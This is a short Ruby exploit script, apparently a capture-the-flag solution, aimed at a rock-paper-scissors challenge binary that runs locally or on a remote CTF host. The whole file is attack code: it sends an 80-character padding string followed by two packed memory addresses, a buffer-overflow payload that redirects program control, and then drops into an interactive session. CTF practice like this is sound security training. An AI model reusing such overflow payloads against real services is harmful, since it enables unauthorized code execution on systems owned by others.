#!/usr/bin/env ruby

require './ctfutils'

if $prod
  pipe = TCPSocket.open('milkyway.chal.mmactf.link', 1641)
else
  pipe = popen('./rps')
end

c = 'abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzab' + [0x601000+0x54].pack('Q') + [0x4008b4].pack('Q')

pipe.puts c
pipe.puts 'r'

pipe.interactive
